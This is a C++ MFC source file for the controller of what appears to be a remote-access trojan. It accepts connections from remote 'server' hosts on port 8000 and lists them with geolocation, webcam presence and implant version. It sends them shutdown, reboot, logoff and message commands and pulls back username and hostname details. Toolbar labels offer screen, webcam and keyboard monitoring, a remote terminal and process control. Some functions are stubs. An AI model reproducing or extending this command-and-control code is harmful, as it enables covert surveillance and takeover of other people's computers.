// RemoteClientDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "RemoteClient.h"
#include "RemoteClientDlg.h"

#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"ws2_32.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedOk();
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CAboutDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CRemoteClientDlg 对话框




CRemoteClientDlg::CRemoteClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CRemoteClientDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	pDlgAbout = new CDlgAbout(this);
	pDlgHostInfo = new CDlgHostInfo(this);
	pDlgSysCmd = new CDlgSysCmd(this);
	pDlgAddRemark = new CDlgAddRemark(this);


}

void CRemoteClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
}

BEGIN_MESSAGE_MAP(CRemoteClientDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_WM_SIZE()
	ON_MESSAGE(ID_ONLINE, OnAddHost)
	ON_MESSAGE(ID_OFFLINE, OnOffLine)
	ON_MESSAGE(ID_TALKMSG, OnTalkMsg)
	ON_MESSAGE(ID_SENDMSGALL, OnSendMsgAll)
	ON_MESSAGE(ID_SHUTDOWNSINGLE, OnShutDownSingle)
	ON_MESSAGE(ID_REBOOTSINGLE, OnRebootSingle)
	ON_MESSAGE(ID_LOGOFFSINGLE, OnLogOffSingle)
	ON_MESSAGE(ID_ADDREMARK, OnAddServerRemark)

	ON_COMMAND(1001, OnFileMgr)
	ON_COMMAND(1012, OnAbout)
	ON_COMMAND(1008, OnHostInfo)
	ON_COMMAND(1007, OnSysCmd)
	ON_COMMAND(1011, OnAddRemark)


	ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST1, &CRemoteClientDlg::OnLvnItemchangedList1)
END_MESSAGE_MAP()


// CRemoteClientDlg 消息处理程序

BOOL CRemoteClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
 
	this->m_max = 1000;
	this->m_port = 8000;
	this->m_Sound = 0;

	UpdateMain(8000);

	::CloseHandle(CreateThread(0,0,OninitSocket,(LPVOID)this,0,0)); //运行线程

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CRemoteClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRemoteClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CRemoteClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CRemoteClientDlg::UpdateMain(int port)
{
    m_imagelist.Create(32,32,ILC_COLOR24|ILC_MASK,1,1);
    CBitmap bmp;
   //1
	bmp.LoadBitmap(IDB_BITMAP1);
    m_imagelist.Add(&bmp,RGB(255,255,255));
    bmp.DeleteObject();
//2
	bmp.LoadBitmap(IDB_BITMAP2);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();
//3
	bmp.LoadBitmap(IDB_BITMAP3);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();
//4
	bmp.LoadBitmap(IDB_BITMAP4);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();

	//5
	bmp.LoadBitmap(IDB_BITMAP5);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();
//6
	bmp.LoadBitmap(IDB_BITMAP9);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();

	bmp.LoadBitmap(IDB_BITMAP14);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();

//7
	bmp.LoadBitmap(IDB_BITMAP10);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();


//8
	bmp.LoadBitmap(IDB_BITMAP7);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();
//9
	bmp.LoadBitmap(IDB_BITMAP6);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();

	bmp.LoadBitmap(IDB_BITMAP16);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();
//10
	bmp.LoadBitmap(IDB_BITMAP8);
	m_imagelist.Add(&bmp,RGB(255,255,255));
	bmp.DeleteObject();


	/*
    m_bmp[0].LoadBitmap(IDB_MENU_EXIT);
    m_bmp[1].LoadBitmap(IDB_MENU_SETTING);
    m_bmp[2].LoadBitmap(IDB_MENU_ABOUT);

    m_subbmp[0].LoadBitmapW(IDB_MENU_AGENT);
    m_subbmp[1].LoadBitmapW(IDB_MENU_SHUTDOWN);
    m_subbmp[2].LoadBitmapW(IDB_MENU_RESTART);
    m_subbmp[3].LoadBitmapW(IDB_MENU_UPDATE);
    m_subbmp[4].LoadBitmapW(IDB_MENU_HTTP);
    m_subbmp[5].LoadBitmapW(IDB_MENU_RUN);

    GetMenu()->GetSubMenu(0)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[0], &m_bmp[0]);
    GetMenu()->GetSubMenu(1)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[1], &m_bmp[1]);
    GetMenu()->GetSubMenu(2)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[2], &m_bmp[2]);
	*/

 const UINT t[14] = {1001,1002,1003,1004,0,1005,1006,1007,1008,0,1009,10010,1011,1012};
    m_toolbar.CreateEx(this);
    m_toolbar.SetButtons(t,14);
    m_toolbar.SetSizes(CSize(60,56),CSize(24,24));
    m_toolbar.SetButtonText(0,_T("文件管理"));
    m_toolbar.SetButtonText(1,_T("屏幕监控"));
    m_toolbar.SetButtonText(2,_T("远程终端"));
    m_toolbar.SetButtonText(3,_T("进程管理"));

    m_toolbar.SetButtonText(5,_T("视频监控"));
	m_toolbar.SetButtonText(6,_T("键盘监控"));
	m_toolbar.SetButtonText(7,_T("系统命令"));
    m_toolbar.SetButtonText(8,_T("远程信息"));
	

    m_toolbar.SetButtonText(10,_T("程序设置"));
	m_toolbar.SetButtonText(11,_T("卸载主机"));
	m_toolbar.SetButtonText(12,_T("添加备注"));
	m_toolbar.SetButtonText(13,_T("关于软件"));

    m_toolbar.GetToolBarCtrl().SetImageList(&m_imagelist);

    BOOL hbar = m_statusbar.Create(this);
    UINT b[2]={1009,1010};
    hbar = m_statusbar.SetIndicators(b,2);
    m_statusbar.SetPaneInfo(0,b[0],SBPS_NORMAL,400);
    m_statusbar.SetPaneInfo(1,b[1],SBPS_NORMAL,180);
    CString ListemPort;
    ListemPort.Format(_T("监听端口：%d"),port);
    m_statusbar.SetPaneText(0,ListemPort);
    m_statusbar.SetPaneText(1,_T("在线主机：0 台"));
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);

	/*
    m_mainicon.Create(16,16,ILC_COLOR24|ILC_MASK,1,0);
    m_mainicon.Add(LoadIcon(AfxGetResourceHandle(),MAKEINTRESOURCE(IDI_USER)));
    m_mainicon.Add(LoadIcon(AfxGetResourceHandle(),MAKEINTRESOURCE(IDI_CAM)));
    m_list.SetImageList(&m_mainicon,LVSIL_SMALL);
	*/

    m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);//|LVS_EX_CHECKBOXES
    m_list.InsertColumn(0,_T("地理位置"),LVCFMT_CENTER,190);
    m_list.InsertColumn(1,_T("IP地址"),LVCFMT_CENTER,130);
    m_list.InsertColumn(2,_T("操作系统"),LVCFMT_CENTER,120);
    m_list.InsertColumn(3,_T("代理状态"),LVCFMT_CENTER,60);
	m_list.InsertColumn(4,_T("摄像头"),LVCFMT_CENTER,60);
    m_list.InsertColumn(5,_T("服务端版本号"),LVCFMT_CENTER,110);
	m_list.InsertColumn(6,_T("服务端备注"),LVCFMT_CENTER,130);

    GetClientRect(&m_rect);

///////////////////////////////////////////////////
	///////初始化DlgHostInfo对话框
////////////////////////////////////////////////////
	
	
}

void CRemoteClientDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	if(nType == SIZE_MINIMIZED)
    {
        return;
    }
    // TODO: 在此处添加消息处理程序代码
    CWnd *pWnd;
    pWnd = GetDlgItem(IDC_LIST1);     //获取控件句柄
    if(pWnd)//判断是否为空，因为对话框创建时会调用此函数，而当时控件还未创建
    {
        CRect rect,rect_l;   //获取控件变化前大小
        GetClientRect(&rect_l);
        pWnd->GetWindowRect(&rect);
        ScreenToClient(&rect);
        rect.right = cx;
        rect.bottom= rect.bottom + (rect_l.bottom - m_rect.bottom);
        pWnd->MoveWindow(rect);//设置控件大小
        RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
    }
    /*
    else
    {
        delete pWnd;
    }
    */
    GetClientRect(&m_rect);
}


BOOL CRemoteClientDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if(pMsg->message==WM_KEYDOWN)
	{
		int nVirtKey = (int)pMsg->wParam;
		if(nVirtKey==VK_RETURN || nVirtKey==VK_ESCAPE)
		{
			return TRUE;
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}


bool CRemoteClientDlg::InitSocket() //初始化SOCKET
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);
	SOCKADDR_IN saddr;

	s=::socket(AF_INET,SOCK_STREAM,0);
	if(s==SOCKET_ERROR)
	{
		MessageBox(_T("创建连接失败"),_T("提示"),MB_OK|MB_ICONWARNING);
		return false;
	}

	saddr.sin_family=AF_INET;
	saddr.sin_addr.S_un.S_addr=INADDR_ANY;
	saddr.sin_port=htons(m_port);

	int nRet;
	nRet=::bind(s,(SOCKADDR *)&saddr,sizeof(saddr));
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("绑定端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
		return false;
	}

	nRet=listen(s,m_max);
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("监听端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
		return false;
	}

	while(1)
	{
		SOCKET SerSock;
		SOCKADDR_IN Seraddr;
		int Seraddrsize=sizeof(Seraddr);

		SerSock = accept(s,(sockaddr *)&Seraddr,&Seraddrsize);
		if (SerSock == INVALID_SOCKET)
		{
			Sleep(200);
			continue;
		}
		AddHost(SerSock,Seraddr);
	}
	return true;
}


DWORD WINAPI CRemoteClientDlg::OninitSocket(LPVOID self) //初始化Socket线程
{
	CRemoteClientDlg* t = (CRemoteClientDlg*)self;
	t->InitSocket();
	return 0;
}

void CRemoteClientDlg::AddHost(SOCKET sock,SOCKADDR_IN addr) //添加主机函数
{
	GetNewItemData(sock,addr);
	return;
}

LRESULT CRemoteClientDlg::OnAddHost(WPARAM wparam,LPARAM lparam) //主机上线消息体
{
	CItemData *t = (CItemData*)wparam;
	int i = m_list.GetItemCount();
	m_list.InsertItem(i,t->m_Address,0);
	m_list.SetItemText(i,1,t->m_IP.GetBuffer());
	m_list.SetItemText(i,2,t->m_OS);
	m_list.SetItemText(i,3,_T("未开启"));
	if(t->Cam)
	{
		m_list.SetItemText(i,4,_T("是"));
	}
	else
	{
		m_list.SetItemText(i,4,_T("否"));
	}

	m_list.SetItemText(i,5,t->m_Ver);
	m_list.SetItemData(i,(DWORD)t);
	ShowOnLine();
	if(m_Sound == 1)
	{
		PlaySoundW(_T("Sound\\online.wav"),0,SND_FILENAME|SND_ASYNC);
	}
	return 0;
}

LRESULT CRemoteClientDlg::OnOffLine(WPARAM wparam,LPARAM lparam) //主机下线消息体
{
	CItemData* t;
	for(int i=0;i<m_list.GetItemCount();i++)
	{
		t = (CItemData*)m_list.GetItemData(i);
		if(t->m_id == (int)wparam)
		{
			::closesocket(t->GetSocket());
			delete t;
			m_list.DeleteItem(i);
		}
	}
	ShowOnLine();
	if(m_Sound == 1)
	{
		PlaySound(_T("Sound\\offline.wav"),0,SND_FILENAME|SND_ASYNC);
	}
	return 0;
}

void  CRemoteClientDlg::ShowOnLine() //设置在线主机
{
	int c=m_list.GetItemCount();
	CString online;
	TCHAR* szText;
	online.Format(_T("在线主机：%d 台"),c);
	szText = online.GetBuffer(online.GetLength());
	::SendMessageW(m_statusbar, SB_SETTEXTW, (WPARAM)1, (LPARAM)szText);
	online.ReleaseBuffer();
}



void CRemoteClientDlg::GetNewItemData(SOCKET sock,SOCKADDR_IN addr) //获取新的条目数据
{
	CItemData *item;
	int id;
	int Count = m_list.GetItemCount();
	if(Count == 0)
	{
		id = 0;
	}
	else
	{
		id = 0;
		for(int i=0;i<Count;i++)
		{
			item = (CItemData*)m_list.GetItemData(i);
			if(item->m_id == id)
			{
				i = 0;
				id = id + 1;
				continue;
			}
		}
	}
	item = NULL;
	item = new CItemData(id,sock,&addr,this->m_hWnd);
	item->Run();
}

void CRemoteClientDlg::OnFileMgr()
{	
	AfxMessageBox(L"文件管理");
}

void CRemoteClientDlg::OnAbout()
{
	
	if (!pDlgAbout->m_hWnd)
	{
		pDlgAbout->Create(IDD_ABOUTBOX,GetDesktopWindow());
		pDlgAbout->ShowWindow(SW_SHOWNORMAL);
	}
	else
	{
		pDlgAbout->DestroyWindow();
		pDlgAbout->Create(IDD_ABOUTBOX,GetDesktopWindow());
		pDlgAbout->ShowWindow(SW_SHOWNORMAL);

	}
}

void CRemoteClientDlg::OnHostInfo()
{
	int iPos = m_list.GetSelectionMark();
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	int nRet;
	msg.Msg_id = RHOSTINFO;
	CItemData *item;
	if (iPos == -1)
	{
		AfxMessageBox(_T("没有选中任何主机！"));
		return;
	}
	item = (CItemData*)m_list.GetItemData(iPos);
	MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));
	memset(&msg, 0, sizeof(msg));
	while(true)
	{

		nRet = MySocket.RecvCommand(item->m_sock,(char*)&msg,sizeof(MSGINFO));
		if(nRet == 0)
		{
			if(WSAGetLastError()==WSAEWOULDBLOCK)  //WSAEWOULDBLOCK的错误,则表示要发生阻塞了
			{
				Sleep(200);
				continue;   //进行下次循环
			}
			else
			{
				//接收消息失败，发送下线通知
				::closesocket(item->m_sock);
				::SendMessage(this->m_hWnd,ID_OFFLINE,item->m_id,0);
				return;
			}
		}
		else
		{
			if (msg.Msg_id == RHOSTINFO)
			{
				HOSTINFO hostinfo;

				memset(&hostinfo,0,sizeof(HOSTINFO));
				memcpy(&hostinfo,msg.context,sizeof(HOSTINFO));
				pDlgHostInfo->lsctrinfo.CpuFreq.Format(_T("%u Mhz"), hostinfo.CpuFreq);
				pDlgHostInfo->lsctrinfo.CpuMaker.Format(_T("%s"), CA2T(hostinfo.CpuMaker));
				pDlgHostInfo->lsctrinfo.CpuType.Format(_T("%s"), CA2T(hostinfo.CpuType));
				pDlgHostInfo->lsctrinfo.TotalPhyMem.Format(_T("%llu MB"), hostinfo.dwTotalPhysMem);
				pDlgHostInfo->lsctrinfo.AvailPhyMem.Format(_T("%llu MB"), hostinfo.dwAvailPhysMem);
				pDlgHostInfo->lsctrinfo.TotalVirMem.Format(_T("%llu MB"), hostinfo.dwTotalVirtualMem);
				pDlgHostInfo->lsctrinfo.AvailVirMem.Format(_T("%llu MB"), hostinfo.dwAvailVirtualMem);
				pDlgHostInfo->lsctrinfo.SystemPath.Format(_T("%s"), CA2T(hostinfo.SysPath));
				pDlgHostInfo->lsctrinfo.UserName.Format(_T("%s"), CA2T(hostinfo.UserName));
				pDlgHostInfo->lsctrinfo.HostName.Format(_T("%s"), CA2T(hostinfo.HostName));
				pDlgHostInfo->lsctrinfo.SysVersion.Format(_T("%s"), CA2T(hostinfo.SystemVersion));
				
				break;
			}
		}
	}
	
	if (!pDlgHostInfo->m_hWnd)
	{
		pDlgHostInfo->Create(IDD_DLGHOSTINFO,GetDesktopWindow());
		pDlgHostInfo->ShowWindow(SW_SHOWNORMAL);
	}
	else
	{
		pDlgHostInfo->DestroyWindow();
		pDlgHostInfo->Create(IDD_DLGHOSTINFO,GetDesktopWindow());
		pDlgHostInfo->ShowWindow(SW_SHOWNORMAL);
	}

	::SendMessage(pDlgHostInfo->m_hWnd, ID_UPDATA,NULL, NULL);
	
}
void CRemoteClientDlg::OnLvnItemchangedList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}

void CRemoteClientDlg::OnSysCmd()
{
	if (!pDlgSysCmd->m_hWnd)
	{
		pDlgSysCmd->Create(IDD_DLGSYSCMD,GetDesktopWindow());
		pDlgSysCmd->ShowWindow(SW_SHOWNORMAL);
	}
	else
	{
		pDlgSysCmd->DestroyWindow();
		pDlgSysCmd->Create(IDD_DLGSYSCMD,GetDesktopWindow());
		pDlgSysCmd->ShowWindow(SW_SHOWNORMAL);

	}
	
}

void CAboutDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	//DestroyWindow();
	OnOK();
}

LRESULT CRemoteClientDlg::OnTalkMsg(WPARAM wparam,LPARAM lparam)
{
	int iPos = m_list.GetSelectionMark();
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	char sendMsgdata[1024*5];
	memset(sendMsgdata, 0, sizeof(sendMsgdata));
	msg.Msg_id = TALKMSG;
	
	USES_CONVERSION;

	//调用函数，T2A和W2A均支持ATL和MFC中的字符转换
	strcpy(sendMsgdata, CW2A(pDlgSysCmd->m_lsmsg.GetBuffer()));
	memcpy(msg.context, sendMsgdata, sizeof(sendMsgdata));
	CItemData *item;
	if (iPos == -1)
	{
		AfxMessageBox(_T("没有选中任何主机！"));
		return 0;
	}
	item = (CItemData*)m_list.GetItemData(iPos);
	MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));

	return 0;
}

LRESULT CRemoteClientDlg::OnSendMsgAll(WPARAM wparam,LPARAM lparam)
{
	int nCnt = m_list.GetItemCount();
	if (nCnt == 0)
	{
		AfxMessageBox(_T("当前无任何主机上线！"));
		return 0;
	}
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	char sendMsgdata[1024*5];
	memset(sendMsgdata, 0, sizeof(sendMsgdata));
	msg.Msg_id = TALKMSG;
	USES_CONVERSION;
	//调用函数，T2A和W2A均支持ATL和MFC中的字符转换
	strcpy(sendMsgdata, CW2A(pDlgSysCmd->m_lsmsg.GetBuffer()));
	memcpy(msg.context, sendMsgdata, sizeof(sendMsgdata));
	CItemData *item;
	for (int i = 0; i < nCnt; i++)
	{
		item = (CItemData*)m_list.GetItemData(i);
		MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));
	}

	return 0;


}

LRESULT CRemoteClientDlg::OnShutDownSingle(WPARAM wparam,LPARAM lparam)
{
	int iPos = m_list.GetSelectionMark();
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	msg.Msg_id = SHUTDOWN;

	CItemData *item;
	if (iPos == -1)
	{
		AfxMessageBox(_T("没有选中任何主机！"));
		return 0;
	}
	item = (CItemData*)m_list.GetItemData(iPos);
	MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));

	return 0;

}

LRESULT CRemoteClientDlg::OnRebootSingle(WPARAM wparam,LPARAM lparam)
{
	int iPos = m_list.GetSelectionMark();
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	msg.Msg_id = REBOOT;

	CItemData *item;
	if (iPos == -1)
	{
		AfxMessageBox(_T("没有选中任何主机！"));
		return 0;
	}
	item = (CItemData*)m_list.GetItemData(iPos);
	MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));

	return 0;

	
}
LRESULT CRemoteClientDlg::OnLogOffSingle(WPARAM wparam,LPARAM lparam)
{
	int iPos = m_list.GetSelectionMark();
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	msg.Msg_id = LOGOFF;

	CItemData *item;
	if (iPos == -1)
	{
		AfxMessageBox(_T("没有选中任何主机！"));
		return 0;
	}
	item = (CItemData*)m_list.GetItemData(iPos);
	MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));

	return 0;

}

LRESULT CRemoteClientDlg::OnShutDownAll(WPARAM wparam,LPARAM lparam)
{
	int nCnt = m_list.GetItemCount();
	if (nCnt == 0)
	{
		AfxMessageBox(_T("当前无任何主机上线！"));
		return 0;
	}
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	msg.Msg_id = SHUTDOWN;
	CItemData *item;
	for (int i = 0; i < nCnt; i++)
	{
		item = (CItemData*)m_list.GetItemData(i);
		MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));
	}

	return 0;


}

LRESULT CRemoteClientDlg::OnRebootAll(WPARAM wparam,LPARAM lparam)
{
	int nCnt = m_list.GetItemCount();
	if (nCnt == 0)
	{
		AfxMessageBox(_T("当前无任何主机上线！"));
		return 0;
	}
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	msg.Msg_id = REBOOT;
	CItemData *item;
	for (int i = 0; i < nCnt; i++)
	{
		item = (CItemData*)m_list.GetItemData(i);
		MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));
	}

	return 0;

}
LRESULT CRemoteClientDlg::OnLogOffAll(WPARAM wparam,LPARAM lparam)
{
	int nCnt = m_list.GetItemCount();
	if (nCnt == 0)
	{
		AfxMessageBox(_T("当前无任何主机上线！"));
		return 0;
	}
	CMySocket MySocket;
	MSGINFO msg;
	memset(&msg, 0, sizeof(msg));
	msg.Msg_id = LOGOFF;
	CItemData *item;
	for (int i = 0; i < nCnt; i++)
	{
		item = (CItemData*)m_list.GetItemData(i);
		MySocket.SendCommand(item->m_sock, (char*)&msg, sizeof(msg));
	}

	return 0;

}

void CRemoteClientDlg::OnAddRemark()
{

	if (!pDlgAddRemark->m_hWnd)
	{
		pDlgAddRemark->Create(IDD_DLGADDREMARK,GetDesktopWindow());
		pDlgAddRemark->ShowWindow(SW_SHOWNORMAL);
	}
	else
	{
		pDlgAddRemark->DestroyWindow();
		pDlgAddRemark->Create(IDD_DLGADDREMARK,GetDesktopWindow());
		pDlgAddRemark->ShowWindow(SW_SHOWNORMAL);
	}

	
	
}

LRESULT CRemoteClientDlg::OnAddServerRemark(WPARAM wparam,LPARAM lparam)
{
	int iPos = m_list.GetSelectionMark();
	if (iPos == -1)
	{
		AfxMessageBox(_T("没有选中任何主机！"));
		return 0;
	}
	m_list.SetItemText(iPos,6,pDlgAddRemark->m_remark.GetBuffer());

	return 0;
}